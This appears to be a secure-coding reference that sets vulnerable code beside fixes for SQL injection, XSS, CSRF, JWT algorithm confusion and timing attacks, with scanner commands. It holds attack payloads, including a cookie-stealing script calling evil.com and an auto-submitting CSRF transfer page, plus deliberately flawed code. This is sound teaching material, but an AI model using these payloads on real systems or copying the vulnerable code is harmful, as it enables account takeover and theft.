# Vulnerability Demonstrations

Interactive examples showing how common vulnerabilities work and how to fix them.

---

## SQL Injection

### Vulnerable Code
```python
# DO NOT USE - Example only
from fastapi import FastAPI, Query
import sqlite3

app = FastAPI()

@app.get("/users/search")
def search_users(username: str = Query(...)):
    conn = sqlite3.connect("app.db")
    cursor = conn.cursor()

    # VULNERABLE: User input directly in query
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)

    return cursor.fetchall()

# Attack payload: username = "' OR '1'='1' --"
# Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1' --'
# This returns ALL users in the database
```

### Secure Code
```python
# Safe implementation using parameterized queries
from fastapi import FastAPI, Query
import sqlite3

app = FastAPI()

@app.get("/users/search")
def search_users(username: str = Query(..., min_length=1, max_length=50)):
    conn = sqlite3.connect("app.db")
    cursor = conn.cursor()

    # SAFE: Parameterized query - input is escaped by the driver
    cursor.execute("SELECT * FROM users WHERE username = ?", (username,))

    return cursor.fetchall()

# With SQLAlchemy ORM (preferred)
from sqlalchemy.orm import Session
from models import User

def search_users_orm(db: Session, username: str):
    # SAFE: ORM handles parameterization
    return db.query(User).filter(User.username == username).first()
```

### Detection
- **Pattern to find**: `f"SELECT`, `f"INSERT`, `f"UPDATE`, `f"DELETE`, `+ "SELECT`
- **Bandit rule**: B608 (hardcoded_sql_expressions)
- **Semgrep rule**: `python.lang.security.audit.formatted-sql-query`

```bash
# Detect with Bandit
bandit -r . -t B608

# Detect with Semgrep
semgrep --config "p/sql-injection" .

# Grep for f-string SQL
grep -rn "f\"SELECT\|f\"INSERT\|f\"UPDATE\|f\"DELETE" --include="*.py" .
```

---

## Cross-Site Scripting (XSS)

### Vulnerable Code
```javascript
// DO NOT USE - Example only

// Reflected XSS - Dangerous innerHTML
function displayMessage() {
    const urlParams = new URLSearchParams(window.location.search);
    const message = urlParams.get('message');

    // VULNERABLE: User input directly inserted as HTML
    document.getElementById('output').innerHTML = message;
}

// Attack payload: ?message=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
// This executes JavaScript that steals cookies
```

```python
# DO NOT USE - Server-side XSS (Flask)
from flask import Flask, request

app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name', '')

    # VULNERABLE: User input in HTML response
    return f"<h1>Hello, {name}!</h1>"

# Attack: /greet?name=<script>alert('XSS')</script>
```

### Secure Code
```javascript
// Safe implementation using textContent
function displayMessage() {
    const urlParams = new URLSearchParams(window.location.search);
    const message = urlParams.get('message');

    // SAFE: textContent escapes HTML entities
    document.getElementById('output').textContent = message;
}

// If HTML is required, use DOMPurify
import DOMPurify from 'dompurify';

function displayRichMessage() {
    const urlParams = new URLSearchParams(window.location.search);
    const message = urlParams.get('message');

    // SAFE: DOMPurify removes malicious content
    document.getElementById('output').innerHTML = DOMPurify.sanitize(message);
}
```

```python
# Safe implementation using template escaping
from flask import Flask, request, render_template_string
from markupsafe import escape

app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name', '')

    # SAFE: escape() converts <script> to &lt;script&gt;
    return f"<h1>Hello, {escape(name)}!</h1>"

# Or use Jinja2 templates (auto-escape by default)
@app.route('/greet-template')
def greet_template():
    return render_template_string(
        "<h1>Hello, {{ name }}!</h1>",  # Auto-escaped
        name=request.args.get('name', '')
    )
```

### Detection
- **Pattern to find**: `.innerHTML =`, `dangerouslySetInnerHTML`, `v-html=`
- **ESLint rule**: `no-unsanitized/property`
- **Semgrep rule**: `javascript.browser.security.insecure-document-method`

```bash
# Detect with Semgrep
semgrep --config "p/xss" .

# Grep for innerHTML
grep -rn "\.innerHTML\s*=" --include="*.js" --include="*.jsx" --include="*.ts" --include="*.tsx" .

# React dangerouslySetInnerHTML
grep -rn "dangerouslySetInnerHTML" --include="*.jsx" --include="*.tsx" .
```

---

## Cross-Site Request Forgery (CSRF)

### Vulnerable Code
```python
# DO NOT USE - Example only
from fastapi import FastAPI, Form

app = FastAPI()

@app.post("/transfer")
async def transfer_money(
    to_account: str = Form(...),
    amount: float = Form(...)
):
    # VULNERABLE: No CSRF protection
    # Attacker can create a form on evil.com that submits to this endpoint
    # When victim visits evil.com while logged in, their session cookie is sent
    perform_transfer(to_account, amount)
    return {"status": "success"}
```

```html
<!-- Attacker's page on evil.com -->
<!-- DO NOT USE - Attack example only -->
<html>
<body onload="document.forms[0].submit()">
  <form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to_account" value="ATTACKER123" />
    <input type="hidden" name="amount" value="10000" />
  </form>
</body>
</html>
```

### Secure Code
```python
# Safe implementation with CSRF tokens
from fastapi import FastAPI, Form, Depends, HTTPException, Request
from fastapi.responses import HTMLResponse
import secrets
from starlette.middleware.sessions import SessionMiddleware

app = FastAPI()
app.add_middleware(SessionMiddleware, secret_key="your-secret-key")

def get_csrf_token(request: Request) -> str:
    if "csrf_token" not in request.session:
        request.session["csrf_token"] = secrets.token_urlsafe(32)
    return request.session["csrf_token"]

def verify_csrf_token(request: Request, csrf_token: str = Form(...)):
    if request.session.get("csrf_token") != csrf_token:
        raise HTTPException(status_code=403, detail="CSRF token mismatch")

@app.get("/transfer-form")
async def transfer_form(request: Request):
    token = get_csrf_token(request)
    return HTMLResponse(f"""
        <form method="POST" action="/transfer">
            <input type="hidden" name="csrf_token" value="{token}" />
            <input name="to_account" placeholder="Account" />
            <input name="amount" type="number" placeholder="Amount" />
            <button type="submit">Transfer</button>
        </form>
    """)

@app.post("/transfer")
async def transfer_money(
    request: Request,
    to_account: str = Form(...),
    amount: float = Form(...),
    _: None = Depends(verify_csrf_token)  # CSRF check
):
    # SAFE: Request will fail without valid CSRF token
    perform_transfer(to_account, amount)
    return {"status": "success"}
```

```python
# Alternative: SameSite cookies (modern approach)
from fastapi import FastAPI, Response

@app.post("/login")
async def login(response: Response, username: str, password: str):
    # Authenticate user...

    # SAFE: SameSite=Strict prevents cross-origin cookie sending
    response.set_cookie(
        key="session_id",
        value=session_token,
        httponly=True,
        secure=True,
        samesite="strict"  # Key protection
    )
    return {"status": "logged_in"}
```

### Detection
- **Check for**: Missing CSRF tokens in forms, cookies without SameSite
- **Semgrep rule**: `python.django.security.audit.csrf-exempt`

```bash
# Check cookie settings
grep -rn "set_cookie\|setCookie" --include="*.py" --include="*.js" . | grep -v "samesite"

# Django CSRF exempt decorators
grep -rn "@csrf_exempt" --include="*.py" .

# Check forms without CSRF tokens
grep -rn "<form" --include="*.html" . | grep -v "csrf"
```

---

## Authentication Bypass

### Vulnerable Code
```python
# DO NOT USE - Example only
from fastapi import FastAPI, Header
import jwt

app = FastAPI()
SECRET_KEY = "mysecret"

@app.get("/admin")
async def admin_panel(authorization: str = Header(...)):
    token = authorization.replace("Bearer ", "")

    # VULNERABLE: Algorithm read from token header (algorithm confusion attack)
    header = jwt.get_unverified_header(token)
    payload = jwt.decode(token, SECRET_KEY, algorithms=[header['alg']])

    # Attacker can set alg="none" or use public key as HMAC secret
    if payload.get("role") == "admin":
        return {"admin_data": "sensitive"}
    return {"error": "Not admin"}
```

```python
# DO NOT USE - Password comparison vulnerable to timing attack
import hmac

def check_password(stored_hash: str, provided_hash: str) -> bool:
    # VULNERABLE: Early exit reveals password length
    if len(stored_hash) != len(provided_hash):
        return False

    # VULNERABLE: Character-by-character comparison
    for a, b in zip(stored_hash, provided_hash):
        if a != b:
            return False
    return True
```

### Secure Code
```python
# Safe implementation with hardcoded algorithm
from fastapi import FastAPI, Header, HTTPException, Depends
import jwt
from datetime import datetime, timedelta

app = FastAPI()
SECRET_KEY = "your-256-bit-secret"
ALGORITHM = "HS256"

def verify_token(authorization: str = Header(...)):
    try:
        token = authorization.replace("Bearer ", "")

        # SAFE: Algorithm is hardcoded, not read from token
        payload = jwt.decode(
            token,
            SECRET_KEY,
            algorithms=[ALGORITHM],  # Fixed algorithm
            options={
                "require": ["exp", "iat", "sub"],  # Required claims
            }
        )

        return payload
    except jwt.ExpiredSignatureError:
        raise HTTPException(401, "Token expired")
    except jwt.InvalidTokenError:
        raise HTTPException(401, "Invalid token")

@app.get("/admin")
async def admin_panel(payload: dict = Depends(verify_token)):
    if payload.get("role") != "admin":
        raise HTTPException(403, "Admin access required")
    return {"admin_data": "sensitive"}
```

```python
# Safe password comparison using constant-time comparison
import hmac
import hashlib

def check_password_secure(stored_hash: str, provided_password: str) -> bool:
    # Hash the provided password
    provided_hash = hashlib.sha256(provided_password.encode()).hexdigest()

    # SAFE: hmac.compare_digest uses constant-time comparison
    return hmac.compare_digest(stored_hash, provided_hash)

# Better: Use a proper password hashing library
from passlib.hash import argon2

def verify_password(plain_password: str, hashed_password: str) -> bool:
    # SAFE: Argon2 handles timing-safe comparison internally
    return argon2.verify(plain_password, hashed_password)
```

### Detection
- **JWT patterns**: `jwt.get_unverified_header`, `algorithms=` with variable
- **Password patterns**: Manual string comparison, missing `hmac.compare_digest`

```bash
# JWT algorithm confusion
grep -rn "get_unverified_header\|algorithms=\[" --include="*.py" .

# Timing attack vulnerable comparisons
semgrep --config "p/python-security-audit" .

# Check for weak password hashing
grep -rn "md5\|sha1\|sha256" --include="*.py" . | grep -i password
```

---

## Summary Table

| Vulnerability | Bandit ID | Semgrep Config | Quick Fix |
|---------------|-----------|----------------|-----------|
| SQL Injection | B608 | p/sql-injection | Parameterized queries |
| XSS | N/A | p/xss | textContent, escape() |
| CSRF | N/A | p/django | SameSite cookies, tokens |
| JWT Algorithm | B105 | p/jwt | Hardcode algorithm |
| Timing Attack | B303 | p/python-security | hmac.compare_digest |

## Related Skills

- `input-validation` - Sanitization patterns
- `auth-patterns` - Authentication implementation
- `security-scanning` - Automated detection